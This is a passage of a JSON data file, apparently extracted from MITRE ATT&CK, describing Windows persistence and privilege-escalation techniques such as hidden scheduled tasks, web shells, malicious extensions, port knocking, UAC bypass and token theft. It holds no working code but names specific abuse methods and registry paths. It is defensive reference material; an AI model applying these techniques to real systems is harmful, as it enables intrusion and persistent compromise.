    "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. Theschtasksutility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.[1]In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library andWindows Management Instrumentation(WMI) to create a scheduled task. Adversaries may also utilize the Powershell CmdletInvoke-CimMethod, which leverages WMI classPS_ScheduledTaskto create a scheduled task via an XML path.[2]An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar toSystem Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.[3]Adversaries may also create \"hidden\" scheduled tasks (i.e.Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task fromschtasks /queryand the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).[4][5]Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g.,Indexvalue) within associated registry keys.[6]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Scheduled Task/Job",
    "parent_technique_id": "T1053",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:28.706362"
  },
  {
    "technique_id": "T1505",
    "name": "Server Software Component",
    "description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.[1]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:32.075947",
    "subtechniques": [
      {
        "id": "T1505.001",
        "name": "SQL Stored Procedures"
      },
      {
        "id": "T1505.002",
        "name": "Transport Agent"
      },
      {
        "id": "T1505.003",
        "name": "Web Shell"
      },
      {
        "id": "T1505.004",
        "name": "IIS Components"
      },
      {
        "id": "T1505.005",
        "name": "Terminal Services DLL"
      }
    ]
  },
  {
    "technique_id": "T1505.001",
    "name": "SQL Stored Procedures",
    "description": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.[1][2]To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.[1][2][3]Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).[4]Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.[5]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Server Software Component",
    "parent_technique_id": "T1505",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:35.404680"
  },
  {
    "technique_id": "T1505.002",
    "name": "Transport Agent",
    "description": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.[1][2]Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.[2]Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Server Software Component",
    "parent_technique_id": "T1505",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:38.748790"
  },
  {
    "technique_id": "T1505.003",
    "name": "Web Shell",
    "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.[1]In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g.China ChopperWeb shell client).[2]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Server Software Component",
    "parent_technique_id": "T1505",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:42.138180"
  },
  {
    "technique_id": "T1505.004",
    "name": "IIS Components",
    "description": "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions:Get{Extension/Filter}Version,Http{Extension/Filter}Proc, and (optionally)Terminate{Extension/Filter}. IIS modules may also be installed to extend IIS web servers.[1][2][3][4]Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.[2][1][5][6][4][7]Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exportsRegisterModule, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.[8][4][9]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Server Software Component",
    "parent_technique_id": "T1505",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:45.490651"
  },
  {
    "technique_id": "T1505.005",
    "name": "Terminal Services DLL",
    "description": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.[1]Windows Services that are run as a \"generic\" process (ex:svchost.exe) load the service's DLL file, the location of which is stored in a Registry entry namedServiceDll.[2]Thetermsrv.dllfile, typically stored in%SystemRoot%\\System32\\, is the defaultServiceDllvalue for Terminal Services inHKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\.Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.[3]Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normaltermsrv.dllfunctionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrentRemote Desktop Protocolsessions by either patching thetermsrv.dllfile or modifying theServiceDllvalue to point to a DLL that provides increased RDP functionality.[4][5]On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Server Software Component",
    "parent_technique_id": "T1505",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:48.818971"
  },
  {
    "technique_id": "T1176",
    "name": "Software Extensions",
    "description": "Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms.[1][2]Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the permissions and access levels of the host application.Malicious extensions can be introduced through various methods, including social engineering, compromised marketplaces, or direct installation by users or by adversaries who have already gained access to a system. Malicious extensions can be named similarly or identically to benign extensions in marketplaces. Security mechanisms in extension marketplaces may be insufficient to detect malicious components, allowing adversaries to bypass automated scanners or exploit trust established during the installation process. Adversaries may also abuse benign extensions to achieve their objectives, such as using legitimate functionality to tunnel data or bypass security controls.The modular nature of extensions and their integration with host applications make them an attractive target for adversaries seeking to exploit trusted software ecosystems. Detection can be challenging due to the inherent trust placed in extensions during installation and their ability to blend into normal application workflows.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:52.145583",
    "subtechniques": [
      {
        "id": "T1176.001",
        "name": "Browser Extensions"
      },
      {
        "id": "T1176.002",
        "name": "IDE Extensions"
      }
    ]
  },
  {
    "technique_id": "T1176.001",
    "name": "Browser Extensions",
    "description": "Adversaries may abuse internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality to and customize aspects of internet browsers. They can be installed directly via a local file or custom URL or through a browser's app store - an official online platform where users can browse, install, and manage extensions for a specific web browser. Extensions generally inherit the web browser's permissions previously granted.[1][2]Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores, so it may not be difficult for malicious extensions to defeat automated scanners.[3]Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary-controlled server or manipulate the mobile configuration file to silently install additional extensions.Previous to macOS 11, adversaries could silently install browser extensions via the command line using theprofilestool to install malicious.mobileconfigfiles. In macOS 11+, the use of theprofilestool can no longer install configuration profiles; however,.mobileconfigfiles can be planted and installed with user interaction.[4]Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.[5][6][7][8]There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions forCommand and Control.[9][10]Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls forDefense Evasion.[11][12]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Software Extensions",
    "parent_technique_id": "T1176",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:55.495943"
  },
  {
    "technique_id": "T1176.002",
    "name": "IDE Extensions",
    "description": "Adversaries may abuse an integrated development environment (IDE) extension to establish persistent access to victim systems.[1]IDEs such as Visual Studio Code, IntelliJ IDEA, and Eclipse support extensions - software components that add features like code linting, auto-completion, task automation, or integration with tools like Git and Docker. A malicious extension can be installed through an extension marketplace (i.e.,Compromise Software Dependencies and Development Tools) or side-loaded directly into the IDE.[2][3]In addition to installing malicious extensions, adversaries may also leverage benign ones. For example, adversaries may establish persistent SSH tunnels via the use of the VSCode Remote SSH extension (i.e.,IDE Tunneling).Trust is typically established through the installation process; once installed, the malicious extension is run every time that the IDE is launched. The extension can then be used to execute arbitrary code, establish a backdoor, mine cryptocurrency, or exfiltrate data.[4]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Software Extensions",
    "parent_technique_id": "T1176",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:58.858510"
  },
  {
    "technique_id": "T1205",
    "name": "Traffic Signaling",
    "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e.Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r[1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enableNetwork Device Authenticationfor standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.[2][3][4]To enable this traffic signaling on embedded devices, adversaries must first achieve and leveragePatch System Imagedue to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.[5][6]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:02.181802",
    "subtechniques": [
      {
        "id": "T1205.001",
        "name": "Port Knocking"
      },
      {
        "id": "T1205.002",
        "name": "Socket Filters"
      }
    ]
  },
  {
    "technique_id": "T1205.001",
    "name": "Port Knocking",
    "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r[1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Traffic Signaling",
    "parent_technique_id": "T1205",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:05.502606"
  },
  {
    "technique_id": "T1205.002",
    "name": "Socket Filters",
    "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as thelibpcaplibrary to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.[1]Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction withProtocol Tunneling.[2][3]Filters can be installed on any Unix-like platform withlibpcapinstalled or on Windows hosts usingWinpcap.  Adversaries may use eitherlibpcapwithpcap_setfilteror the standard library functionsetsockoptwithSO_ATTACH_FILTERoptions. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Traffic Signaling",
    "parent_technique_id": "T1205",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:08.858574"
  },
  {
    "technique_id": "T1078",
    "name": "Valid Accounts",
    "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1]Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:12.261126",
    "subtechniques": [
      {
        "id": "T1078.001",
        "name": "Default Accounts"
      },
      {
        "id": "T1078.002",
        "name": "Domain Accounts"
      },
      {
        "id": "T1078.003",
        "name": "Local Accounts"
      }
    ]
  },
  {
    "technique_id": "T1078.001",
    "name": "Default Accounts",
    "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.[1][2][3]Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolenPrivate Keysor credential materials to legitimately connect to remote environments viaRemote Services.[4]Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account calledvpxuseris created on the ESXi server. If a threat actor is able to compromise this accountâ€™s credentials (for example, viaExploitation for Credential Accesson the vCenter host), they will then have access to the ESXi server.[5][6]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:15.532203"
  },
  {
    "technique_id": "T1078.002",
    "name": "Domain Accounts",
    "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.[1]Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]Adversaries may compromise domain accounts, some with a high level of privileges, through various means such asOS Credential Dumpingor password reuse, allowing access to privileged resources of the domain.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:18.918478"
  },
  {
    "technique_id": "T1078.003",
    "name": "Local Accounts",
    "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials throughOS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:22.199066"
  },
  {
    "technique_id": "T1548",
    "name": "Abuse Elevation Control Mechanism",
    "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.[1][2]An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.[3][4]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:25.473846",
    "subtechniques": [
      {
        "id": "T1548.002",
        "name": "Bypass User Account Control"
      }
    ]
  },
  {
    "technique_id": "T1548.002",
    "name": "Bypass User Account Control",
    "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.[1]If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevatedComponent Object Modelobjects without prompting the user through the UAC notification box.[2][3]An example of this is use ofRundll32to load a specifically crafted DLL which loads an auto-elevatedComponent Object Modelobject and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.[4]Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods[5]that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:eventvwr.execan auto-elevate and execute a specified binary or script.[6][7]Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.[8]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Abuse Elevation Control Mechanism",
    "parent_technique_id": "T1548",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:28.860487"
  },
  {
    "technique_id": "T1134",
    "name": "Access Token Manipulation",
    "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e.Token Impersonation/Theft) or used to spawn a new process (i.e.Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.[1]Any standard user can use therunascommand, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:32.119838",
    "subtechniques": [
      {
        "id": "T1134.001",
        "name": "Token Impersonation/Theft"
      },
      {
        "id": "T1134.002",
        "name": "Create Process with Token"
      },
      {
        "id": "T1134.003",
        "name": "Make and Impersonate Token"
      },
      {
        "id": "T1134.004",
        "name": "Parent PID Spoofing"
      },
      {
        "id": "T1134.005",
        "name": "SID-History Injection"
      }
    ]
  },
  {
    "technique_id": "T1134.001",
    "name": "Token Impersonation/Theft",
    "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token usingDuplicateTokenorDuplicateTokenEx.[1]The token can then be used withImpersonateLoggedOnUserto allow the calling thread to impersonate a logged on user's security context, or withSetThreadTokento assign the impersonated token to a thread.An adversary may performToken Impersonation/Theftwhen they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionallyCreate Process with TokenusingCreateProcessWithTokenWorCreateProcessAsUserW.Token Impersonation/Theftis also distinct fromMake and Impersonate Tokenin that it refers to duplicating an existing token, rather than creating a new one.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:35.448615"
  },
  {
    "technique_id": "T1134.002",
    "name": "Create Process with Token",
    "description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such asCreateProcessWithTokenWandrunas.[1]Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated viaToken Impersonation/Theftor created viaMake and Impersonate Tokenbefore being used to create a process.While this technique is distinct fromToken Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:38.770018"
  },
  {
    "technique_id": "T1134.003",
    "name": "Make and Impersonate Token",
    "description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using theLogonUserfunction.[1]The function will return a copy of the new session's access token and the adversary can useSetThreadTokento assign the token to a thread.This behavior is distinct fromToken Impersonation/Theftin that this refers to creating a new user token instead of stealing or duplicating an existing one.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:42.154723"
  },
  {
    "technique_id": "T1134.004",
    "name": "Parent PID Spoofing",
    "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via theCreateProcessAPI call, which supports a parameter that defines the PPID to use.[1]This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically viasvchost.exeorconsent.exe) rather than the current user context.[2]Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID ofPowerShell/Rundll32to beexplorer.exerather than an Office document delivered as part ofSpearphishing Attachment.[3]This spoofing could be executed viaVisual Basicwithin a malicious Office document or any code that can performNative API.[4][3]Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such aslsass.exe), causing the new process to be elevated via the inherited access token.[5]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Access Token Manipulation",
    "parent_technique_id": "T1134",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:01:45.494403"
  },
  {
    "technique_id": "T1134.005",
    "name": "SID-History Injection",
    "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.[1]An account can hold additional SIDs in the SID-History Active Directory attribute[2], allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).With Domain Administrator (or equivalent) rights, harvested or well-known SID values[3]may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such asRemote Services,SMB/Windows Admin Shares, orWindows Remote Management.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
